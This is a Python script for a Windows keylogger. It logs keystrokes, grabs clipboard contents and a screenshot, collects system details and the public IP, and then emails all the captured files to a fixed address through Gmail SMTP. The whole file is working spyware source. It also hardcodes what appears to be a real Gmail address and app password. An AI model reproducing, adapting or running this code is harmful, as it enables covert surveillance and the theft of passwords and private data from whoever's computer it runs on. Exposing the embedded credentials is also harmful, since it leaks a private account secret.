from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard
from pynput.keyboard import Key, Listener

import time
import os

from requests import get
from PIL import ImageGrab

# Email sending function
def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Here is the log file."
    msg.attach(MIMEText(body, 'plain'))

    try:
        with open(attachment, 'rb') as f:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(f.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(p)
    except Exception as e:
        print(f"Failed to attach file {filename}: {e}")
        return

    try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, app_password)
        s.sendmail(fromaddr, toaddr, msg.as_string())
        s.quit()
        print(f"Email sent successfully with {filename}")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Email controls and file paths
email_address = "parugula.saicharan@gmail.com"
app_password = "nmiv etwo xagk xbgb"
toaddr = "parugula.laxmipriya@gmail.com"

file_path = "E:\\AdvKeylogger"
extend = "\\"
file_merge = file_path + extend

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

if not os.path.exists(file_path):
    os.makedirs(file_path)

# Get the computer information
def computer_information():
    with open(file_merge + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# Get the clipboard contents
def copy_clipboard():
    with open(file_merge + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied\n")

copy_clipboard()

# Get screenshots
def screenshot():
    try:
        im = ImageGrab.grab()
        im.save(file_merge + screenshot_information)
    except Exception as e:
        print(f"Failed to take screenshot: {e}")

screenshot()

# Keylogger functionality
keys = []

def on_press(key):
    global keys
    k = str(key).replace("'", "")
    
    if k.find("space") > 0:
        keys.append('\n')  # Add new line on space key
    elif k.find("Key") == -1:
        keys.append(k)  # Add character keys only

    # Immediately write keys to file
    write_file()

def write_file():
    with open(file_merge + keys_information, "a") as f:
        for key in keys:
            f.write(key)
        f.flush()  # Ensure the keys are written immediately to file
    keys.clear()  # Clear keys after writing to file

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# After capturing keys, send email
send_email(keys_information, file_merge + keys_information, toaddr)
send_email(screenshot_information, file_merge + screenshot_information, toaddr)
send_email(clipboard_information, file_merge + clipboard_information, toaddr)
